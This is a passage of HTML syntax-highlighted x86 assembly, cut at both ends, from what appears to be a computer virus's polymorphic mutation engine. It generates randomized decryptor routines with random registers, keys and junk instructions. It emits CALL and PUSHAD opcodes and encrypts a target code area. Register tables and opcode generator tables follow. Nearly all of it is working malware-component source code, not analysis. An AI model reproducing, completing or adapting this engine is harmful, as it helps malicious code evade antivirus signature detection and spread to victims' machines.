                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_IS_COUNTER</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">          </span><span class="sc1">;Choose displacement</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ok_disp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000FFFFFh</span><span class="sc0">
</span><span class="sc5">ok_disp</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_disp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">              </span><span class="sc1">;Get encryption key</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_key</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                                  
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">              </span><span class="sc1">;Get generation flags</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">          </span><span class="sc1">;Get size of mem operand</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_size_ok</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_size_ok</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">get_size_ok</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PtrToDecrypt</span><span class="sc4">]</span><span class="sc1">;Ptr to decryptor</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_rnd_block</span><span class="sc0">          </span><span class="sc1">;Random data block</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">           </span><span class="sc1">;Generate 5 routines</span><span class="sc0">

</span><span class="sc5">do_subroutine</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">routine_done</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">           </span><span class="sc1">;Random step</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">style_table</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
                
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;Already generated?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">routine_done</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;Generate routine</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_ret</span><span class="sc0">
                
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_rnd_block</span><span class="sc0">
                
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;Generate next subroutine</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">do_subroutine</span><span class="sc0">
                
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">entry_point</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">;Decryptor entry-point</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;If this is the 1st decryptor we need to save</span><span class="sc0">
        </span><span class="sc1">;some regs</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IsFirst</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">SkipSaveRegs</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_free</span><span class="sc0">           </span><span class="sc1">;Random code, save regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">          </span><span class="sc1">;We need to PUSHAD</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">SkipSaveRegs</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">        </span><span class="sc1">;We can trash regs now</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">style_table</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">

</span><span class="sc5">do_call</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">;Gen CALL to each step</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">is_not_loop</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">loop_point</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">is_not_loop</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">         </span><span class="sc1">;CALL opcode</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">do_call</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">        </span><span class="sc1">;End condition</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_loop</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_rnd_block</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PtrToDecrypt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PtrToCrypt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fixed_size2ecx</span><span class="sc0">     </span><span class="sc1">;Encrypt requested area</span><span class="sc0">
</span><span class="sc5">loop_hide_code</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">perform_crypt</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">loop_copy_res</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_copy_res</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_hide_code</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">entry_point</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;Get entry-point offset</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Poly engine initialized data</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Register table</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; 00h -&gt; BYTE -&gt; Register mask</span><span class="sc0">
                </span><span class="sc1">; 01h -&gt; BYTE -&gt; Register flags</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">tbl_regs</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000000b</span><span class="sc4">,</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">      </span><span class="sc1">;eax</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000011b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                </span><span class="sc1">;ebx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                </span><span class="sc1">;ecx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000010b</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                </span><span class="sc1">;edx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000110b</span><span class="sc4">,</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">        </span><span class="sc1">;esi</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000111b</span><span class="sc4">,</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">        </span><span class="sc1">;edi</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00000101b</span><span class="sc4">,</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">        </span><span class="sc1">;ebp</span><span class="sc0">

</span><span class="sc5">end_regs</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Aliases for reg table structure</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">REG_MASK</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">REG_FLAGS</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Bit aliases for reg flags</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">REG_IS_INDEX</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">;Register used as main index register</span><span class="sc0">
</span><span class="sc5">REG_IS_COUNTER</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">;This register is used as loop counter</span><span class="sc0">
</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">         </span><span class="sc1">;Never modify the value of this register</span><span class="sc0">
</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">         </span><span class="sc1">;ESI EDI and EBP havent 8bit version</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Initial reg flags</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">tbl_startup</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">REG_READ_ONLY</span><span class="sc0">        </span><span class="sc1">;eax</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                  </span><span class="sc1">;ebx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                  </span><span class="sc1">;ecx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                  </span><span class="sc1">;edx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">REG_NO_8BIT</span><span class="sc0">          </span><span class="sc1">;esi</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">REG_NO_8BIT</span><span class="sc0">          </span><span class="sc1">;edi</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">REG_NO_8BIT</span><span class="sc0">          </span><span class="sc1">;ebp</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Code that does not disturb reg values</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">tbl_save_code</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">cmc</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">std</span><span class="sc0">
                
</span><span class="sc5">end_save_code</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Generators for [reg] indexing mode</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">tbl_idx_reg</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_inc_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_dec_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_not_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_add_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_sub_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xx_xor_reg</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Generators for [reg+imm] indexing mode</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">tbl_dis_reg</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_inc_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_dec_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_not_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_add_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_sub_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">yy_xor_reg</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Generators for [reg+reg] indexing mode</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">tbl_xtended</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_inc_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_dec_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_not_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_add_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_sub_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_xor_reg</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Generators for [reg+reg+imm] indexing mode</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">tbl_paranoia</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_inc_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_dec_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_not_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_add_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_sub_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_xor_reg</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Opcodes for math reg,imm</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">tbl_math_imm</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">                         </span><span class="sc1">;add</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C8h</span><span class="sc0">                         </span><span class="sc1">;or</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">                         </span><span class="sc1">;and</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">                         </span><span class="sc1">;sub</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">                         </span><span class="sc1">;xor</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">                         </span><span class="sc1">;adc</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc0">                         </span><span class="sc1">;sbb</span><span class="sc0">

</span><span class="sc5">end_math_imm</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Magic aliases</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
</span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Magic data</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">xx_inc_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">                
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
